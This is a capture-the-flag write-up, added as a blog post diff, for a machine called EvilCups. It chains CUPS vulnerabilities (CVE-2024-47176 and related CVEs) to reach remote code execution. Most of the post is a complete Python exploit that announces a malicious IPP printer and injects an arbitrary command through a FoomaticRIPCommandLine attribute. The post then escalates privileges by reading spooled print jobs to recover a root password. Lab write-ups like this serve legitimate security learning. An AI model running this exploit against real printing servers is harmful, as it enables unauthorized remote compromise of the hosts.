@@ -1,0 +1,284 @@
+---
+layout: post
+title: "EvilCups 11db952552918080abc6ea8e4ca765e3"
+date:   2025-07-14 12:05:57 -0400
+categories: writeups
+---
+
+# EvilCups
+
+# 1. Enumeration
+
+Start enumerating ports
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image.png' | relative_url }})
+
+We can see CUPS running on 631 port, we can see the http api, we can see connected printers, jobs and its states
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_1.png' | relative_url }})
+
+Normally we only scan tcp ports, but due to this is a printer service, we might need to check udp ports as well. effectively it is also communicating through udp
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_2.png' | relative_url }})
+
+# 2. User flag
+
+Checking for vulnerabilities, there is a recent release, a serie of vulnerabilities where we can gain rce when we chain them
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_3.png' | relative_url }})
+
+There is a PoC on internet, basically
+
+<aside>
+⚠️
+
+`CVE-2024-47176` cups-browsed allows an attacker to install a remote malicious printer
+
+`CVE-2024-47076` libcupsfilters allows an attacker provide malicious attributes in the printer to the cups
+
+`CVE-2024-47175` libppd allows an attacker write in the PostScript Printer Description which is a file that determines how to print a document
+
+`CVE-2024-47177` cups-filters allows inject malicious code to trigger it when the printer is used
+
+</aside>
+
+```python
+
+#!/usr/bin/python3
+import sys
+import threading
+import socket
+import time
+
+from ippserver.server import IPPServer
+from ippserver.server import IPPRequestHandler
+import ippserver.behaviour as behaviour
+from ippserver.constants import (
+	OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
+)
+from ippserver.parsers import Integer, Enum, Boolean
+from ippserver.request import IppRequest
+
+class ServerContext:
+	def __init__(self, server):
+		self.server = server
+		#Necessary no initialaze because we are using a new thread
+		self.server_thread = None
+	
+	#This is used when we call the class in a with statement
+	def __enter__(self):
+		print(f'IPP server Listening on {server.server_address}')
+		#Keeping the server up until it would be stopped manually
+		self.server_thread = threading.Thread(target=self.server.serve_forever)
+		#Configure a daemon to the thread which relates the thread with the server
+		#When the server stops the thread does the same
+		self.server_thread.daemon = True
+		self.server_thread.start()
+	
+	#It executes when we go out from the with statement
+	#exc_type and exc_value exception values to debug
+	#traceback contains information about errors
+	def __exit__(self, exc_type, exc_value, traceback):
+		print('Shutting down the server....')
+		self.server.shutdown()
+		#Waiting until the server thread ends 
+		self.server_thread.join()
+
+#It intercepts signals from the Operative System
+def handle_signal(signum, frame):
+	raise KeyboardInterrupt()
+		
+
+##Malicious is inherited from StatelessPrinter
+class MaliciousPrinter(behaviour.StatelessPrinter):
+	def __init__(self, command):
+		self.command = command
+		##It makes sure that we can call methods of statelessprinter
+		##From Malicious printer
+		super(MaliciousPrinter, self).__init__()
+	#Attributes to write into .PPD file
+	def printer_list_attributes(self):
+		attr = {
+			(SectionEnum.printer, b'printer-uri-supported', TagEnum.uri): [self.printer_uri],
+			(SectionEnum.printer, b'uri-authentication-supported', TagEnum.keyword):[b'none'],
+			(SectionEnum.printer, b'uri-security-supported', TagEnum.keyword):[b'none'],
+			(SectionEnum.printer, b'printer-name', TagEnum.name_without_language):[b'Main Printer'],
+			(SectionEnum.printer, b'printer-info', TagEnum.text_without_language):[b'Main Printer Info'],
+			(SectionEnum.printer, b'printer-make-and-model', TagEnum.text_without_language):[b'HP 0.00'],
+			(SectionEnum.printer, b'printer-state', TagEnum.enum):[Enum(3).bytes()], #3 in idle
+			(SectionEnum.printer, b'printer-state-reasons', TagEnum.keyword):[b'none'],
+			(SectionEnum.printer, b'ipp-versions-supported', TagEnum.keyword):[b'1.1'],
+			(SectionEnum.printer, b'operations-supported', TagEnum.enum):[
+			Enum(x).bytes()
+			for x in (
+				OperationEnum.print_job,
+				OperationEnum.validate_job,
+				OperationEnum.cancel_job,
+				OperationEnum.get_job_attributes,
+				OperationEnum.get_printer_attributes,
+			)],
+			(SectionEnum.printer, b'multiple-document-jobs-supported', TagEnum.boolean):[Boolean(False).bytes()],
+			(SectionEnum.printer, b'charset-configured', TagEnum.charset):[b'utf-8'],
+			(SectionEnum.printer, b'charset-supported', TagEnum.charset):[b'utf-8'],
+			(SectionEnum.printer, b'natural-language-configured', TagEnum.natural_language):[b'en'],
+			(SectionEnum.printer, b'generated-natural-language-supported', TagEnum.natural_language):[b'en'],
+			(SectionEnum.printer, b'document-format-default', TagEnum.mime_media_type):[b'application/pdf'],
+			(SectionEnum.printer, b'document-format-supported', TagEnum.mime_media_type):[b'application/pdf'],
+			(SectionEnum.printer, b'printer-is-accepting-jobs', TagEnum.boolean):[Boolean(True).bytes()],
+			(SectionEnum.printer, b'queued-job-count', TagEnum.integer):[Integer(777).bytes()],
+			(SectionEnum.printer, b'pdl-override-supported', TagEnum.keyword):[b'not-attempted'],
+			(SectionEnum.printer, b'printer-up-time', TagEnum.integer):[Integer(self.printer_uptime()).bytes()],
+			(SectionEnum.printer, b'compression-supported', TagEnum.keyword):[b'none'],
+			(SectionEnum.printer, b'printer-more-info', TagEnum.integer):[
+				#Double quote at the begining to close the parameter with no info
+				#Write your own parameters
+				f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()
+				#No double quotes at the end
+				
+			],
+		}
+		#It adds basic attributes from the parent class
+		attr.update(super().minimal_attributes())
+		return attr
+		
+		#Function that sends the attributes of the malicious printer to CUPS
+		#Req onject from IppRequest 
+		#_psfile PostScript file
+	def operation_printer_list_response(self, req, _psfile):
+		print("\ntarget connected, sending payload ....")
+		attributes = self.printer_list_attributes()
+		return IppRequest(
+			self.version,
+			StatusCodeEnum.ok,
+			#Keeping coherence between requests and responses
+			req.request_id,
+			attributes)
+				
+def send_browsed_packet(target_ip, target_port, ipp_server, ipp_server_port):
+	print(f"Sending upd packet to {target_ip}:{target_port}...")
+	printer_type = 2
+	printer_state = '3'
+	printer_uri = f'http://{ipp_server}:{ipp_server_port}/printers/EVILCUPS'
+	printer_location = '"Pwned"'
+	printer_info = '"POWN"'
+	printer_model = '"HP LaserJet 1020"'
+	#Printer type hex format
+	packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"
+	
+	#AF_INET means ipv4, SOCK_DGRAM means a socket udp based
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.sendto(packet.encode('utf-8'), (target_ip,target_port))
+	
+	
+#It runs the server until the user use Crtl+c
+def run_server(server):
+	with ServerContext(server):
+		try:
+			while True:
+				time.sleep(.5)
+		#It only go out from thw with statement allowing to execute __exit__
+		except KeyboardInterrupt:
+			pass
+	##__exit__ againt it called
+	server.shutdown()
+	
+
+if __name__ == "__main__":
+	if len(sys.argv) != 4:
+		print("%s <LOCAL_HOST> <TARGET_HOST> <COMMNAND>" % sys.argv[0])
+		quit()
+		
+	SERVER_HOST = sys.argv[1]
+	SERVER_PORT = 12345
+	
+	command = sys.argv[3]
+	
+	#It creates a new instance with the malicious printer
+	server = IPPServer((SERVER_HOST, SERVER_PORT),
+										IPPRequestHandler, MaliciousPrinter(command))
+								
+	#Using a thread to run a server as the malicious printer
+	threading.Thread(
+		target = run_server,
+		args=(server, )
+	).start()
+	
+	TARGET_HOST = sys.argv[2]
+	TARGET_PORT = 631
+	
+	send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)
+	
+	print("Please wait, this normally takes 30 seconds....")
+	
+	seconds = 0
+	
+	while True:
+		#\r carrigae return, makes overwrite the text
+		#end="" avoid jumping to another line
+		#flush = makes the buffer empty immediately
+		print(f"\r{seconds} elapsed", end="", flush= True)
+		time.sleep(1)
+		seconds +=1
+		
+	
+	
+```
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_4.png' | relative_url }})
+
+Effectively it is added
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_5.png' | relative_url }})
+
+When we test our malicious printer we get the rev shell and the user flag
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_6.png' | relative_url }})
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_7.png' | relative_url }})
+
+# 3.Priv esc
+
+There we can see out malicious printer
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_8.png' | relative_url }})
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_9.png' | relative_url }})
+
+Check for the jobs running on it on `/var/spool/cups` actually we can’t list jobs, we have not got permissions but according with the format we will be able to cat them to get information, the format is in this way
+
+<aside>
+⚠️
+
+For job description:  `c00001` 
+
+For the content send to the printer:**`d00001-001`** 
+
+d —> Data file of the printer job
+
+00001 —> ID of the printer job
+
+001 —> Copy number or fragment
+
+</aside>
+
+Cat the file
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_10.png' | relative_url }})
+
+And find the password for the root user
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_11.png' | relative_url }})
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_12.png' | relative_url }})
+
+Note that it is a PostScript document, we can copy it 
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_13.png' | relative_url }})
+
+And visualize it as a .pdf file
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_14.png' | relative_url }})
+
+![image.png]({{ '/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_15.png' | relative_url }})
+
+Machine pwned!!!
